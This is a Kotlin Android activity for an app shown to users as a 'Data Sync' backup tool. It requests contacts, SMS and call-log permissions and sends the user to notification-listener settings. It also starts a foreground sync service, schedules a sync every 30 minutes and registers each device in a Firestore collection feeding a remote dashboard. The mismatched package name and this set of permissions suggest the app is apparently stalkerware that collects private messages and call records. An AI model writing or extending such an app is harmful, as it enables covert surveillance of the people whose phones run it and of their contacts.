package com.boxx.porn

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.boxx.porn.sync.SyncService
import com.boxx.porn.sync.SyncWorker
import com.boxx.porn.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

@AndroidEntryPoint
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    SyncScreen()
                }
            }
        }
        setupWorkManager()
    }

    private fun setupWorkManager() {
        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(30, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "PeriodicSync",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SyncScreen() {
    val context = LocalContext.current
    val activity = context as MainActivity
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }
    val deviceId = remember { DeviceIdHelper.getDeviceId(context) }
    var lastSyncTime by remember { mutableStateOf("Never") }
    var syncStatus by remember { mutableStateOf("Idle") }
    var isLoading by remember { mutableStateOf(false) }
    var showRationale by remember { mutableStateOf(false) }
    var showSettingsDialog by remember { mutableStateOf(false) }

    val requiredPermissions = remember {
        mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { perms ->
        val allGranted = perms.entries.filter { it.key != Manifest.permission.POST_NOTIFICATIONS }.all { it.value }
        if (allGranted) {
            startSyncService(context)
        } else {
            val permanentlyDenied = perms.keys.any {
                !ActivityCompat.shouldShowRequestPermissionRationale(activity, it) &&
                ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
            }
            if (permanentlyDenied) {
                showSettingsDialog = true
            } else {
                scope.launch { snackbarHostState.showSnackbar("Permissions are essential for backup.") }
            }
        }
    }

    LaunchedEffect(Unit) {
        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
            .addSnapshotListener { snapshot, _ ->
                snapshot?.getLong("lastSyncTime")?.let {
                    val sdf = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                    lastSyncTime = sdf.format(Date(it))
                    syncStatus = "Up to date"
                    isLoading = false
                }
            }

        if (hasPermissions(context, requiredPermissions)) {
            startSyncService(context)
        }
    }

    Scaffold(
        topBar = {
            CenterAlignedTopAppBar(
                title = { Text("Data Sync", fontWeight = FontWeight.Bold) },
                actions = {
                    IconButton(onClick = {
                        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                        context.startActivity(intent)
                    }) {
                        Icon(Icons.Default.Settings, contentDescription = "Notification Access")
                    }
                }
            )
        },
        snackbarHost = { SnackbarHost(snackbarHostState) }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(24.dp)
        ) {
            // Hero Section
            Box(
                modifier = Modifier
                    .size(120.dp)
                    .padding(8.dp),
                contentAlignment = Alignment.Center
            ) {
                if (isLoading) {
                    CircularProgressIndicator(modifier = Modifier.fillMaxSize(), strokeWidth = 8.dp)
                } else {
                    Icon(
                        imageVector = if (syncStatus == "Up to date") Icons.Default.CheckCircle else Icons.Default.Info,
                        contentDescription = null,
                        modifier = Modifier.fillMaxSize(),
                        tint = if (syncStatus == "Up to date") MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.secondary
                    )
                }
            }

            Text(
                text = syncStatus,
                style = MaterialTheme.typography.headlineMedium,
                fontWeight = FontWeight.Bold,
                color = if (syncStatus == "Up to date") MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurface
            )

            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f))
            ) {
                Column(modifier = Modifier.padding(20.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    InfoRow(label = "Device ID", value = deviceId)
                    InfoRow(label = "Last Synced", value = lastSyncTime)
                }
            }

            Spacer(modifier = Modifier.weight(1f))

            Button(
                onClick = {
                    if (hasPermissions(context, requiredPermissions)) {
                        isLoading = true
                        syncStatus = "Syncing..."
                        startSyncService(context)
                    } else {
                        val shouldShowRationale = requiredPermissions.any { ActivityCompat.shouldShowRequestPermissionRationale(activity, it) }
                        if (shouldShowRationale) showRationale = true else launcher.launch(requiredPermissions)
                    }
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(64.dp),
                shape = RoundedCornerShape(16.dp),
                enabled = !isLoading
            ) {
                Icon(Icons.Default.Refresh, contentDescription = null)
                Spacer(modifier = Modifier.width(8.dp))
                Text("Sync Now", fontSize = 18.sp, fontWeight = FontWeight.SemiBold)
            }

            Text(
                "Automatic sync is enabled every 30 minutes",
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }

        if (showRationale) {
            AlertDialog(
                onDismissRequest = { showRationale = false },
                title = { Text("Permissions Needed") },
                text = { Text("We need Contacts, SMS, and Call Logs permissions to securely backup your data to your dashboard.") },
                confirmButton = {
                    Button(onClick = {
                        showRationale = false
                        launcher.launch(requiredPermissions)
                    }) { Text("Grant") }
                },
                dismissButton = { TextButton(onClick = { showRationale = false }) { Text("Deny") } }
            )
        }

        if (showSettingsDialog) {
            AlertDialog(
                onDismissRequest = { showSettingsDialog = false },
                title = { Text("Settings Required") },
                text = { Text("Permissions were permanently denied. Please enable them in app settings to continue.") },
                confirmButton = {
                    Button(onClick = {
                        showSettingsDialog = false
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.fromParts("package", context.packageName, null)
                        }
                        context.startActivity(intent)
                    }) { Text("Open Settings") }
                },
                dismissButton = { TextButton(onClick = { showSettingsDialog = false }) { Text("Cancel") } }
            )
        }
    }
}

@Composable
fun InfoRow(label: String, value: String) {
    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
        Text(label, style = MaterialTheme.typography.bodyMedium, color = MaterialTheme.colorScheme.onSurfaceVariant)
        Text(value, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Bold)
    }
}

private fun hasPermissions(context: android.content.Context, permissions: Array<String>): Boolean {
    return permissions.all {
        if (it == Manifest.permission.POST_NOTIFICATIONS && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) true
        else ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
    }
}

private fun startSyncService(context: android.content.Context) {
    val intent = Intent(context, SyncService::class.java)
    try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}
